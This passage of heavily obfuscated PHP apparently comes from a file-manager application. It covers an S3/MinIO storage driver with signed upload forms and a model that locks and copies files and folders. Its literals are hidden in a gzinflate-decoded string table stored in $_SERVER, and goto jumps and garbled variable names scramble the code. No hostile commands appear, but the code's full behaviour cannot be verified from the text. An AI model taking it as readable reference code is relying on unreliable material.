$this->isFolder($¨¹¹Íâ“); } public function isFile($ôöõ¿ˆı) { return !$this->isFolder($ôöõ¿ˆı) && $this->objectMeta($ôöõ¿ˆı); } public function isFolder($¼¯ÖÉµ) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][179], $¼¯ÖÉµ); } protected function objectMeta($íÁ¬°è) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][181], $íÁ¬°è); } protected function _objectMeta($¶³¯Èá) { $‰˜Ö¹“Õ =& $_SERVER[£ğ°ÖØø]; $¶³¯Èá = rtrim($¶³¯Èá, $‰˜Ö¹“Õ[8]); try { $¸ùé‡ã‡ = $this->client->getObjectInfo($this->bucket, $¶³¯Èá); if (!isset($¸ùé‡ã‡[$‰˜Ö¹“Õ[252]]) && isset($¸ùé‡ã‡[$‰˜Ö¹“Õ[268]])) { $¸ùé‡ã‡[$‰˜Ö¹“Õ[252]] = $¸ùé‡ã‡[$‰˜Ö¹“Õ[268]]; } } catch (Exception $ê£¶ÌÕÕ) { $¸ùé‡ã‡ = !1; } if (!$¸ùé‡ã‡) { } return $¸ùé‡ã‡; } protected function _isFolder($µöÛÔÛ®) { $µ™à«· =& $_SERVER[£ğ°ÖØø]; $µöÛÔÛ® = rtrim($µöÛÔÛ®, $µ™à«·[8]); if ($µöÛÔÛ® == $µ™à«·[12] || $µöÛÔÛ® == $µ™à«·[8]) { return !0; } $Üú÷›åû = $this->client->getBucket($this->bucket, $µöÛÔÛ®, null, 1); if (empty($Üú÷›åû[$µ™à«·[236]])) { return !1; } $òœ›ÔµÂ = $Üú÷›åû[$µ™à«·[236]][0][$µ™à«·[32]]; return stripos($òœ›ÔµÂ, $µöÛÔÛ® . $µ™à«·[8]) === 0 ? !0 : !1; if (substr($òœ›ÔµÂ, -1) == $µ™à«·[8]) { return !0; } if (get_path_this($òœ›ÔµÂ) == get_path_this($µöÛÔÛ®)) { return !1; } return !0; } public function listObject($ÁÏ—ÁÌ) { return $this->fileList($ÁÏ—ÁÌ, $_SERVER[£ğ°ÖØø][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ıÌœ¥¶ü) { $Ê¶‘£…¶ =& $_SERVER[£ğ°ÖØø]; parent::__construct($ıÌœ¥¶ü); $this->setSignVersion($Ê¶‘£…¶[247]); if (!$this->region) { $this->region = $Ê¶‘£…¶[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ Í—§øƒ = $this->getBucketRgn(); return $this->region == $ Í—§øƒ ? !0 : !1; } public function uploadFormData($Š¦ÅÛ»ı, $¿—éúı„ = 3600) { $Şº ›¨ =& $_SERVER[£ğ°ÖØø]; $ÄŠÜõÓÄ = $Şº ›¨[229]; $õå®¤Ö• = $Şº ›¨[270]; $•Õæ¢ÏÔ = $Şº ›¨[62]; $Ø¬ÇÃÉ­ = gmdate($Şº ›¨[271]); $şÚæû°¤ = gmdate($Şº ›¨[272]); $ÚÊ¾®é¹ = $Şº ›¨[273]; $³©•†–Ì = $¿—éúı„ . $Şº ›¨[12]; $ÕÌúİ°Ù = $Şº ›¨[274]; $ß¡ÂğÊ = array($this->accessKey, $şÚæû°¤, $this->region, $•Õæ¢ÏÔ, $ÚÊ¾®é¹); $²™¤ÆÈ› = implode($Şº ›¨[8], $ß¡ÂğÊ); $ Û·Ä¤‰ = array($Şº ›¨[275] => gmdate($Şº ›¨[276], strtotime($Şº ›¨[277])), $Şº ›¨[278] => array(array($Şº ›¨[279] => $this->bucket), array($Şº ›¨[280] => $ÄŠÜõÓÄ), array($Şº ›¨[281], $Şº ›¨[282], $Şº ›¨[12]), array($Şº ›¨[281], $Şº ›¨[283], $Şº ›¨[12]), array($Şº ›¨[281], $Şº ›¨[284], $Şº ›¨[12]), array($Şº ›¨[285] => $ÕÌúİ°Ù), array($Şº ›¨[286] => $²™¤ÆÈ›), array($Şº ›¨[287] => $õå®¤Ö•), array($Şº ›¨[288] => $Ø¬ÇÃÉ­), array($Şº ›¨[289] => $³©•†–Ì))); $ãŒ‰’ªâ = base64_encode(json_encode($ Û·Ä¤‰)); $²Ï§¯€È = hash_hmac($Şº ›¨[290], $şÚæû°¤, $Şº ›¨[291] . $this->secret, !0); $ÒóøÔ¿ƒ = hash_hmac($Şº ›¨[290], $this->region, $²Ï§¯€È, !0); $ÍÚ¹Ğ™Ş = hash_hmac($Şº ›¨[290], $•Õæ¢ÏÔ, $ÒóøÔ¿ƒ, !0); $Ãª·ËÃ = hash_hmac($Şº ›¨[290], $ÚÊ¾®é¹, $ÍÚ¹Ğ™Ş, !0); $¢à¯Ë²» = hash_hmac($Şº ›¨[290], $ãŒ‰’ªâ, $Ãª·ËÃ); $¢Ñö‡ì = array($Şº ›¨[246] => $Şº ›¨[12], $Şº ›¨[292] => $Şº ›¨[12], $Şº ›¨[280] => $ÄŠÜõÓÄ, $Şº ›¨[285] => $ÕÌúİ°Ù, $Şº ›¨[293] => $ãŒ‰’ªâ, $Şº ›¨[294] => $²™¤ÆÈ›, $Şº ›¨[295] => $õå®¤Ö•, $Şº ›¨[296] => $Ø¬ÇÃÉ­, $Şº ›¨[297] => $³©•†–Ì, $Şº ›¨[298] => $¢à¯Ë²», $Şº ›¨[208] => $this->getHost()); return $¢Ñö‡ì; } } goto dÎÁ†Û÷°Á; cº¯¦åÊšº: define($_SERVER[£ğ°ÖØø][0], $_SERVER[£ğ°ÖØø][1]); $_SERVER[ı¨ûå›¤] = explode($_SERVER[£ğ°ÖØø][2], gzinflate(substr($_SERVER[£ğ°ÖØø][3], 10, -8))); function binCheckEq($¿Èğ¢Š, $€‹’¸¸Û) { return $¿Èğ¢Š == $€‹’¸¸Û; } goto d¹Ë´£ßÜÅ; d¦°ö½¦õ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÚÕë£¯µ) { $ÎÄ¼üÉƒ =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÎÄ¼üÉƒ[627], $ÚÕë£¯µ); $…‹Ş±È‘ = 1; $this->_lockEvent($ÚÕë£¯µ, array($ÎÄ¼üÉƒ[628], $ÎÄ¼üÉƒ[629]), $…‹Ş±È‘); $this->_lockParent($ÚÕë£¯µ, array($ÎÄ¼üÉƒ[629]), $…‹Ş±È‘); $this->_lockEvent($ÚÕë£¯µ, array($ÎÄ¼üÉƒ[630], $ÎÄ¼üÉƒ[631]), $…‹Ş±È‘); $this->_lockCheckEnd($ÎÄ¼üÉƒ[627], $ÚÕë£¯µ); } public function lockCopyEnd($õŠá¤Ã) { $éÄ·˜û =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $Ç·áîØë = 0; $this->_lockEvent($õŠá¤Ã, array($éÄ·˜û[628], $éÄ·˜û[629]), $Ç·áîØë); $this->_lockParent($õŠá¤Ã, array($éÄ·˜û[629]), $Ç·áîØë); $this->_lockEvent($õŠá¤Ã, array($éÄ·˜û[630], $éÄ·˜û[631]), $Ç·áîØë); } public function lockWriteStart($†®§ê°, $ïääúÚ = '') { $üá“ßğä =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $this->_lockCheck($üá“ßğä[628], $†®§ê°); $¤ŞİƒğÓ = 1; $this->_lockKey($üá“ßğä[632] . $†®§ê° . $üá“ßğä[10] . $ïääúÚ, $¤ŞİƒğÓ); $this->_lockEvent($†®§ê°, array($üá“ßğä[627], $üá“ßğä[629]), $¤ŞİƒğÓ); $this->_lockParent($†®§ê°, array($üá“ßğä[627], $üá“ßğä[629]), $¤ŞİƒğÓ); $this->_lockCheckEnd($üá“ßğä[628], $†®§ê°); } public function lockWriteEnd($¯‹ô–şé, $Ù¹™‘°â = '') { $€Ëæ´¸ =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $Õ²Éóß² = 0; $this->_lockKey($€Ëæ´¸[632] . $¯‹ô–şé . $€Ëæ´¸[10] . $Ù¹™‘°â, $Õ²Éóß²); $this->_lockEvent($¯‹ô–şé, array($€Ëæ´¸[627], $€Ëæ´¸[629]), $Õ²Éóß²); $this->_lockParent($¯‹ô–şé, array($€Ëæ´¸[627], $€Ëæ´¸[629]), $Õ²Éóß²); } public function lockMoveStart($Î¶“ïÛ) { $š•×ÁÂ =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $this->_lockCheck($š•×ÁÂ[629], $Î¶“ïÛ); $Æû¬ººº = 1; $this->_lockKey($š•×ÁÂ[633] . $Î¶“ïÛ, $Æû¬ººº); $this->_lockEvent($Î¶“ïÛ, array($š•×ÁÂ[627], $š•×ÁÂ[628]), $Æû¬ººº); $this->_lockParent($Î¶“ïÛ, array($š•×ÁÂ[627], $š•×ÁÂ[629]), $Æû¬ººº); $this->_lockEvent($Î¶“ïÛ, array($š•×ÁÂ[634], $š•×ÁÂ[630], $š•×ÁÂ[631]), $Æû¬ººº); $this->_lockCheckEnd($š•×ÁÂ[629], $Î¶“ïÛ); } public function lockMoveEnd($Î»Í…¼‡) { $ÊãÍÍú =& $_SERVER[£ğ°ÖØø]; if (!$this->allowLock()) { return; } $–¸íçœ¥ = 0; $this->_lockKey($ÊãÍÍú[633] . $Î»Í…¼‡, $–¸íçœ¥); $this->_lockEvent($Î»Í…¼‡, array($ÊãÍÍú[627], $ÊãÍÍú[628]), $–¸íçœ¥); $this->_lockParent($Î»Í…¼‡, array($ÊãÍÍú[627], $ÊãÍÍú[629]), $–¸íçœ¥); $this->_lockEvent($Î»Í…¼‡, array($ÊãÍÍú[634], $ÊãÍÍú[630], $ÊãÍÍú[631]), $–¸íçœ¥); } private function _lockCheck($†µª’—Ğ, $å¬ÚÂ‚µ) { $ä—ï¢Ï¬ =& $_SERVER[£ğ°ÖØø]; $Ò¥¨· = $this->sourceInfo($å¬ÚÂ‚µ); $ÓÎÄ—ş× = $†µª’—Ğ . $ä—ï¢Ï¬[10] . $å¬ÚÂ‚µ; $this->_lockTimeStart[$ÓÎÄ—ş×] = timeFloat(); if (!is_array($Ò¥¨·)) { return; } $Ö¥Ãî§Á = LNG($ä—ï¢Ï¬[635]); CacheLock::setErrorMsg($ä—ï¢Ï¬[176] . htmlspecialchars($Ò¥¨·[$ä—ï¢Ï¬[32]]) . $ä—ï¢Ï¬[178] . $Ö¥Ãî§Á); $this->_lockKey($ÓÎÄ—ş×, 1); $this->_lockKey($ÓÎÄ—ş×, 0); $àüÌ¨¸ß = array_reverse($this->parentLevelArray($Ò¥¨·[$ä—ï¢Ï¬[593]])); foreach ($àüÌ¨¸ß as $Ä™àÈŞÂ) { $ÓÎÄ—ş× = $†µª’—Ğ . $ä—ï¢Ï¬[636] . $Ä™àÈŞÂ; if (CacheLock::lockGet($ä—ï¢Ï¬[637] . $ÓÎÄ—ş×)) { $Ò¥¨· = $this->sourceInfo($Ä™àÈŞÂ); CacheLock::setErrorMsg($ä—ï¢Ï¬[176] . htmlspecialchars($Ò¥¨·[$ä—ï¢Ï¬[32]]) . $ä—ï¢Ï¬[178] . $Ö¥Ãî§Á); $this->_lockKey($ÓÎÄ—ş×, 1); $this->_lockKey($ÓÎÄ—ş×, 0); } } } private function _lockCheckEnd($¸Ñ”ó½â, $»¼˜ñÅ‘) { $Ä÷œ»± =& $_SERVER[£ğ°ÖØø]; $óæ©Î±· = $¸Ñ”ó½â . $Ä÷œ»±[10] . $»¼˜ñÅ‘; CacheLock::setErrorMsg($Ä÷œ»±[463]); if (!isset($this->_lockTimeStart[$óæ©Î±·])) { return; } $”‘…Å£À = timeFloat() - $this->_lockTimeStart[$óæ©Î±·]; unset($this->_lockTimeStart[$óæ©Î±·]); if ($”‘…Å£À > 0.5) { unset(self::$cacheSourceInfo[$Ä÷œ»±[542] . $»¼˜ñÅ‘]); } $‰àÎïÕú = $this->sourceInfo($»¼˜ñÅ‘); if (!$‰àÎïÕú) { show_json(LNG($Ä÷œ»±[108]), !1); } } private function _lockParent($¾¨Î…‰Ğ, $Ñ„£ŠŠ, $½‘–Á) { if (!$this->autoLockSet) { return; } $Úšô„Š = $this->sourceInfo($¾¨Î…‰Ğ); if (!is_array($Úšô„Š)) { return; } $§õÈÍÚ = array_reverse($this->parentLevelArray($Úšô„Š[$_SERVER[£ğ°ÖØø][593]])); foreach ($§õÈÍÚ as $´Ì…Ø´) { $this->_lockEvent($´Ì…Ø´, $Ñ„£ŠŠ, $½‘–Á); } } private function _lockEvent($íÓè²Ë, $Ûç’êñ­, $ƒ…ÈëƒÓ) { $ØõëİÌŒ =& $_SERVER[£ğ°ÖØø]; if (!$this->autoLockSet) { return; } foreach ($Ûç’êñ­ as $Æ¥¨ËÆø) { $ğ¼®õø = $Æ¥¨ËÆø . $ØõëİÌŒ[10] . $íÓè²Ë; if ($ƒ…ÈëƒÓ && CacheLock::lockGet($ØõëİÌŒ[637] . $ğ¼®õø)) { continue; } $this->_lockKey($ğ¼®õø, $ƒ…ÈëƒÓ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Å×¡¡—Î, $ŸˆÆû”Á = 1) { $­Ñªâõ = $_SERVER[£ğ°ÖØø][637] . md5($Å×¡¡—Î); if ($ŸˆÆû”Á) { if (isset(self::$_lockItemArr[$­Ñªâõ])) { return; } self::$_lockItemArr[$­Ñªâõ] = 1; CacheLock::lock($­Ñªâõ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$­Ñªâõ])) { return; } unset(self::$_lockItemArr[$­Ñªâõ]); CacheLock::unlock($­Ñªâõ); } } public function isParentOf($«¨Ë˜µÏ, $İ‹Å…şá) { $Áñ‹ò” =& $_SERVER[£ğ°ÖØø]; $•í¥àèÁ = $this->sourceInfo($«¨Ë˜µÏ); $¼·´°Ç¡ = $this->sourceInfo($İ‹Å…şá); $ì­ñà½· = $•í¥àèÁ[$Áñ‹ò”[593]] . $•í¥àèÁ[$Áñ‹ò”[193]] . $Áñ‹ò”[50]; $ôõçÓ² = $¼·´°Ç¡[$Áñ‹ò”[593]] . $¼·´°Ç¡[$Áñ‹ò”[193]] . $Áñ‹ò”[50]; $Ú’×ïô = strpos($ôõçÓ², $ì­ñà½·) === 0; return $Ú’×ïô; } private $targetIsDelete = 0; public function copy($®©­¥º, $ã€™”ƒÍ, $Ğ”—Ğ‚À = REPEAT_REPLACE, $ÅŞëİĞ£ = '') { $¸Ğ€ñ¤ =& $_SERVER[£ğ°ÖØø]; $§›±€£™ = $this->sourceInfo($®©­¥º); $ò²°Úş = $this->sourceInfo($ã€™”ƒÍ); if (!$§›±€£™ || !$ò²°Úş || $ò²°Úş[$¸Ğ€ñ¤[494]] != $¸Ğ€ñ¤[91]) { return !1; } if ($this->isParentOf($®©­¥º, $ã€™”ƒÍ)) { return !1; } $ÏŠÇú  = $ÅŞëİĞ£ ? $ÅŞëİĞ£ : $§›±€£™[$¸Ğ€ñ¤[32]]; $this->lockCopyStart($®©­¥º); $this->lockWriteStart($ã€™”ƒÍ, $ÏŠÇú ); $ÄÍò…­´ = array($¸Ğ€ñ¤[638] => array(), $¸Ğ€ñ¤[639] => array(), $¸Ğ€ñ¤[640] => array()); $this->targetIsDelete = intval($§›±€£™[$¸Ğ€ñ¤[514]]); $¯ú•›å‚ = $this->fileNameExistAuto($ã€™”ƒÍ, $§›±€£™); $Òú»™£ = $this->_copy($®©­¥º, $ã€™”ƒÍ, $Ğ”—Ğ‚À, $ÄÍò…­´, !0, $ÅŞëİĞ£); $this->_childrenListClear(); $this->lockCopyEnd($®©­¥º); $this->lockWriteEnd($ã€™”ƒÍ, $ÏŠÇú ); if ($§›±€£™[$¸Ğ€ñ¤[494]] == $¸Ğ€ñ¤[91] && $¯ú•›å‚ == $Òú»™£) { $this->folderSizeResetChildren($¯ú•›å‚); } Model($¸Ğ€ñ¤[641])->addAll($ÄÍò…­´[$¸Ğ€ñ¤[639]], array(), !0); if ($¯ú•›å‚ != $Òú»™£ || $§›±€£™[$¸Ğ€ñ¤[494]] == $¸Ğ€ñ¤[91]) { Model($¸Ğ€ñ¤[642])->eventCopy($Òú»™£); } $this->saveAll($ÄÍò…­´[$¸Ğ€ñ¤[640]]); Model($¸Ğ€ñ¤[230])->linkAdd($ÄÍò…­´[$¸Ğ€ñ¤[638]]); $this->folderSizeReset($ã€™”ƒÍ); $this->updateModifyTime($ã€™”ƒÍ); return $Òú»™£; } private function _copy($‚¶äéØÒ, $“¨‰÷‘‰, $ª£¥¡», &$ÑŒøæê, $½ğİç¾, $ïò–‘ïı = '') { $©ÀîÄ–Æ =& $_SERVER[£ğ°ÖØø]; $ºåÓ‹‡® = $this->sourceInfoCache($‚¶äéØÒ); $³ä“¹×Ï = $ºåÓ‹‡®[$©ÀîÄ–Æ[494]] == $©ÀîÄ–Æ[91]; $Ô£ï¬‡ = $ïò–‘ïı ? $ïò–‘ïı : $ºåÓ‹‡®[$©ÀîÄ–Æ[32]]; $ÛÀœöãÅ = $this->fileNameExistAuto($“¨‰÷‘‰, $ºåÓ‹‡®); if ($½ğİç¾) { $this->_childrenAllMake($‚¶äéØÒ); if ($³ä“¹×Ï && $ÛÀœöãÅ) { $this->_childrenAllMake($ÛÀœöãÅ); } } if (!$ÛÀœöãÅ) { return $this->_copyCreate($‚¶äéØÒ, $“¨‰÷‘‰, $Ô£ï¬‡, $ÑŒøæê); } $úñÛ·º = $ÛÀœöãÅ; if ($³ä“¹×Ï) { if ($ª£¥¡» == REPEAT_RENAME_FOLDER) { $Ô£ï¬‡ = $this->fileNameAutoCache($“¨‰÷‘‰, $Ô£ï¬‡, $ª£¥¡», $³ä“¹×Ï); $úñÛ·º = $this->_copyCreate($‚¶äéØÒ, $“¨‰÷‘‰, $Ô£ï¬‡, $ÑŒøæê); } else { $ÊÖ³®ôñ = $this->_childrenList($‚¶äéØÒ); foreach ($ÊÖ³®ôñ as $¡èÖúò±) { $this->_copy($¡èÖúò±[$©ÀîÄ–Æ[193]], $ÛÀœöãÅ, $ª£¥¡», $ÑŒøæê, !1); } } } else { if ($ª£¥¡» == REPEAT_RENAME || $ª£¥¡» == REPEAT_RENAME_FOLDER) { $Ô£ï¬‡ = $this->fileNameAutoCache($“¨‰÷‘‰, $Ô£ï¬‡, $ª£¥¡», $³ä“¹×Ï); $úñÛ·º = $this->_copyCreate($‚¶äéØÒ, $“¨‰÷‘‰, $Ô£ï¬‡, $ÑŒøæê); } else { if ($ª£¥¡» == REPEAT_REPLACE) { $â¢ø†›ï = $this->sourceInfoCache($ÛÀœöãÅ); $æ›Ôşëµ = $this->fileHistory($â¢ø†›ï, $ºåÓ‹‡®[$©ÀîÄ–Æ[550]], $ºåÓ‹‡®[$©ÀîÄ–Æ[79]]); if ($æ›Ôşëµ) { $ÑŒøæê[$©ÀîÄ–Æ[638]][] = $ºåÓ‹‡®[$©ÀîÄ–Æ[550]]; } } else { if ($ª£¥¡» == REPEAT_SKIP) { } } } Hook::trigger($©ÀîÄ–Æ[643], array($©ÀîÄ–Æ[644], $ºåÓ‹‡®, 0)); } return $úñÛ·º; } private function _copyCreate($®é§îƒË, $Ü¸µ¼¾¿, $ƒ²Œ¢ŠÍ, &$³ºóÁó•) { $ÂÊŸ›°© =& $_SERVER[£ğ°ÖØø]; $†‡£¿Í› = $this->sourceInfoCache($®é§îƒË); $Š³—½Øú = $this->sourceInfoCache($Ü¸µ¼¾¿); $ù›„ßŞ = $this->_makeItemData($†‡£¿Í›, $Š³—½Øú, $ƒ²Œ¢ŠÍ); Hook::trigger($ÂÊŸ›°©[645], $ù›„ßŞ); Hook::trigger($ÂÊŸ›°©[646], array($ÂÊŸ›°©[647], $ù›„ßŞ, 0)); $ĞÍ‚Û€ = $this->add($ù›„ßŞ); $ºÖ”™ı = array($ÂÊŸ›°©[193] => $ĞÍ‚Û€, $ÂÊŸ›°©[32] => $ƒ²Œ¢ŠÍ); $this->_copyApplyMeta($ºÖ”™ı, $³ºóÁó•); if ($†‡£¿Í›[$ÂÊŸ›°©[494]] != $ÂÊŸ›°©[91]) { $³ºóÁó•[$ÂÊŸ›°©[638]][] = $†‡£¿Í›[$ÂÊŸ›°©[550]]; return $ĞÍ‚Û€; } $ÑĞõâŒù = array(); $ª°¹©œÒ = array(); $this->_childrenListAll($®é§îƒË, $ÑĞõâŒù); $ÍƒäÎ´ = count($ÑĞõâŒù); if ($ÍƒäÎ´ == 0) { return $ĞÍ‚Û€; } $’ß„¹¸Ó = $this->sourceInfo($ĞÍ‚Û€); foreach ($ÑĞõâŒù as $í»â¹º×) { $­íÃÚ¡³ = $this->_makeItemData($í»â¹º×, $’ß„¹¸Ó, $í»â¹º×[$ÂÊŸ›°©[32]]); $­íÃÚ¡³[$ÂÊŸ›°©[593]] = $í»â¹º×[$ÂÊŸ›°©[593]]; $ª°¹©œÒ[] = $­íÃÚ¡³; } $this->chunkEventSet($ÂÊŸ›°©[648], array($ÂÊŸ›°©[649], $ù›„ßŞ, $ÍƒäÎ´)); $this->addAll($ª°¹©œÒ, array(), !1); $‹‹Ê¿¸ø = $this->where(array($ÂÊŸ›°©[192] => $ĞÍ‚Û€))->select(); $Ù÷ÀÀ°½ = $this->_childrenMakeRelation($ÑĞõâŒù, $‹‹Ê¿¸ø); $Ù÷ÀÀ°½[$®é§îƒË] = $ĞÍ‚Û€; $ãë”Ùß  = array(); $êıÖ£˜ñ = array(); foreach ($‹‹Ê¿¸ø as $í»â¹º×) { $ÃÜºÈ§§ = $í»â¹º×[$ÂÊŸ›°©[193]]; $«õ–‰´« = $this->_childrenMatch($Ù÷ÀÀ°½, $í»â¹º×, $’ß„¹¸Ó); $ãë”Ùß [] = array($ÂÊŸ›°©[193], $ÃÜºÈ§§, $ÂÊŸ›°©[192], $«õ–‰´«[$ÂÊŸ›°©[192]]); $êıÖ£˜ñ[] = array($ÂÊŸ›°©[193], $ÃÜºÈ§§, $ÂÊŸ›°©[593], $«õ–‰´«[$ÂÊŸ›°©[593]]); $this->_copyApplyMeta($í»â¹º×, $³ºóÁó•); if ($í»â¹º×[$ÂÊŸ›°©[494]] != $ÂÊŸ›°©[91]) { $³ºóÁó•[$ÂÊŸ›°©[638]][] = $í»â¹º×[$ÂÊŸ›°©[550]]; } } $this->chunkEventSet($ÂÊŸ›°©[650], array($ÂÊŸ›°©[651], $ù›„ßŞ, $ÍƒäÎ´)); $this->saveAll($ãë”Ùß ); $this->chunkEventSet($ÂÊŸ›°©[652], array($ÂÊŸ›°©[653], $ù›„ßŞ, $ÍƒäÎ´)); $this->saveAll($êıÖ£˜ñ); return $ĞÍ‚Û€; } private function _childrenMakeRelation($ç£úÛ‘Ş, $üñô™±») { $¸ÍñİÜ =& $_SERVER[£ğ°ÖØø]; $÷‚ôâÕÀ = array(); $ˆş¹µÏä = array(); foreach ($ç£úÛ‘Ş as $•ƒÇ†Ñô) { $…ó–Ñú± = $•ƒÇ†Ñô[$¸ÍñİÜ[32]] . $¸ÍñİÜ[8] . $•ƒÇ†Ñô[$¸ÍñİÜ[593]]; $÷‚ôâÕÀ[$…ó–Ñú±] = $•ƒÇ†Ñô[$¸ÍñİÜ[193]]; } foreach ($üñô™±» as $•ƒÇ†Ñô) { $…ó–Ñú± = $•ƒÇ†Ñô[$¸ÍñİÜ[32]] . $¸ÍñİÜ[8] . $•ƒÇ†Ñô[$¸ÍñİÜ[593]]; $ŠÊŸê¸Ü = $÷‚ôâÕÀ[$…ó–Ñú±]; $ˆş¹µÏä[$ŠÊŸê¸Ü] = $•ƒÇ†Ñô[$¸ÍñİÜ[193]]; } return $ˆş¹µÏä; } private function _childrenMatch($‚ë±¡€¡, $ÀÂê¥”Ì, $™šèĞ­¾) { $îüÍÔ½ =& $_SERVER[£ğ°ÖØø]; $”³ß¦‚ˆ = $™šèĞ­¾[$îüÍÔ½[593]]; $¬ó½‘Ï = $this->parentLevelArray($ÀÂê¥”Ì[$îüÍÔ½[593]]); foreach ($¬ó½‘Ï as $éÆ¢Ù¯À) { if (isset($‚ë±¡€¡[$éÆ¢Ù¯À])) { $”³ß¦‚ˆ .= $‚ë±¡€¡[$éÆ¢Ù¯À] . $îüÍÔ½[654]; } } $”³ß¦‚ˆ = rtrim($”³ß¦‚ˆ, $îüÍÔ½[50]) . $îüÍÔ½[50]; $¨°È½ = $this->parentLevelArray($”³ß¦‚ˆ); $×‚¶òÎ¼ = $¨°È½[count($¨°È½) - 1]; return array($îüÍÔ½[192] => $×‚¶òÎ¼, $îüÍÔ½[593] => $”³ß¦‚ˆ); } private function _makeItemData($ĞÁ­‚ é, $â¨”şŸ, $âå¯¿›¤) { $…ë€åñÏ =& $_SERVER[£ğ°ÖØø]; $˜÷Óì¡ = array($…ë€åñÏ[655] => $ĞÁ­‚ é[$…ë€åñÏ[494]], $…ë€åñÏ[503] => $âå¯¿›¤, $…ë€åñÏ[656] => $ĞÁ­‚ é[$…ë€åñÏ[495]] ? $ĞÁ­‚ é[$…ë€åñÏ[495]] : $…ë€åñÏ[12], $…ë€åñÏ[551] => $ĞÁ­‚ é[$…ë€åñÏ[550]] ? $ĞÁ­‚ é[$…ë€åñÏ[550]] : 0, $…ë€åñÏ[626] => $ĞÁ­‚ é[$…ë€åñÏ[79]] ? $ĞÁ­‚ é[$…ë€åñÏ[79]] : 0, $…ë€åñÏ[657] => intval($â¨”şŸ[$…ë€åñÏ[190]]), $…ë€åñÏ[658] => intval($â¨”şŸ[$…ë€åñÏ[578]]), $…ë€åñÏ[659] => intval(USER_ID), $…ë€åñÏ[660] => intval(USER_ID), $…ë€åñÏ[486] => intval($â¨”şŸ[$…ë€åñÏ[193]]), $…ë€åñÏ[661] => $â¨”şŸ[$…ë€åñÏ[593]] . $â¨”şŸ[$…ë€åñÏ[193]] . $…ë€åñÏ[50], $…ë€åñÏ[507] => $ĞÁ­‚ é[$…ë€åñÏ[88]] ? $ĞÁ­‚ é[$…ë€åñÏ[88]] : time(), $…ë€åñÏ[513] => 0, $…ë€åñÏ[662] => $…ë€åñÏ[12]); return $˜÷Óì¡; } private function _copyApplyMeta($ÈÃößÔ, &$±Ì´™º) { $”Ñ¡¯½ü =& $_SERVER[£ğ°ÖØø]; $İÑ·ÛÁÌ = $ÈÃößÔ[$”Ñ¡¯½ü[193]]; $¢±¨®Å™ = $ÈÃößÔ[$”Ñ¡¯½ü[32]]; if (!isset($ÈÃößÔ[$”Ñ¡¯½ü[663]]) || !$ÈÃößÔ[$”Ñ¡¯½ü[663]] || $ÈÃößÔ[$”Ñ¡¯½ü[663]] == $”Ñ¡¯½ü[228]) { $±Ì´™º[$”Ñ¡¯½ü[640]][] = array($”Ñ¡¯½ü[193], $İÑ·ÛÁÌ, $”Ñ¡¯½ü[663], short_id($İÑ·ÛÁÌ)); } if (Input::check($¢±¨®Å™, $”Ñ¡¯½ü[664])) { $±Ì´™º[$”Ñ¡¯½ü[639]][] = array($”Ñ¡¯½ü[193] => $İÑ·ÛÁÌ, $”Ñ¡¯½ü[97] => $”Ñ¡¯½ü[547], $”Ñ¡¯½ü[459] => str_replace($”Ñ¡¯½ü[53], $”Ñ¡¯½ü[12], Pinyin::get($¢±¨®Å™))); $±Ì´™º[$”Ñ¡¯½ü[639]][] = array($”Ñ¡¯½ü[193] => $İÑ·ÛÁÌ, $”Ñ¡¯½ü[97] => $”Ñ¡¯½ü[546], $”Ñ¡¯½ü[459] => Pinyin::get($¢±¨®Å™, $”Ñ¡¯½ü[665])); } $±Ì´™º[$”Ñ¡¯½ü[639]][] = array($”Ñ¡¯½ü[193] => $İÑ·ÛÁÌ, $”Ñ¡¯½ü[97] => $”Ñ¡¯½ü[526], $”Ñ¡¯½ü[459] => KodSort::makeStr($¢±¨®Å™)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Š¬Ü£ı…) { $ıòÁËüØ =& $_SERVER[£ğ°ÖØø]; $À®Åè®¿ = $this->sourceInfo($Š¬Ü£ı…); $ƒëÌ©ÂÎ = $ıòÁËüØ[666]; $ ŠİŞ¥ = array($ıòÁËüØ[593] => array($ıòÁËüØ[621], $À®Åè®¿[$ıòÁËüØ[593]] . $Š¬Ü£ı… . $ıòÁËüØ[622]), $ıòÁËüØ[514] => $this->targetIsDelete); $ÌÕ¯³°ñ = $this->field($ƒëÌ©ÂÎ)->where($ ŠİŞ¥)->select(); if (!$ÌÕ¯³°ñ) { return; } $ÌÕ¯³°ñ = array_to_keyvalue($ÌÕ¯³°ñ, $ıòÁËüØ[193]); foreach ($ÌÕ¯³°ñ as $–´úà¸º) { $¤Ú»½ñ’ = $–´úà¸º[$ıòÁËüØ[192]]; $Š¬Ü£ı… = $–´úà¸º[$ıòÁËüØ[193]]; if (!isset($this->_childrenListCache[$Š¬Ü£ı…]) && $–´úà¸º[$ıòÁËüØ[494]] == $ıòÁËüØ[91]) { $this->_childrenListCache[$Š¬Ü£ı…] = array(); } if (!isset($this->_childrenListCache[$¤Ú»½ñ’])) { $this->_childrenListCache[$¤Ú»½ñ’] = array(); } $this->_childrenListCache[$¤Ú»½ñ’][$Š¬Ü£ı…] = $–´úà¸º; $this->_childrenItemCache[$Š¬Ü£ı…] = $–´úà¸º; } } private function _childrenListAll($º×…òæ¿, &$í¦æÆ) { $¿öï¡»Ï =& $_SERVER[£ğ°ÖØø]; if (!isset($this->_childrenListCache[$º×…òæ¿])) { return; } $ËˆñåÇˆ = $this->_childrenListCache[$º×…òæ¿]; foreach ($ËˆñåÇˆ as $¾ÏèĞÄ => $Œ‡®ú„) { $í¦æÆ[$¾ÏèĞÄ] = $Œ‡®ú„; if ($Œ‡®ú„[$¿öï¡»Ï[494]] == 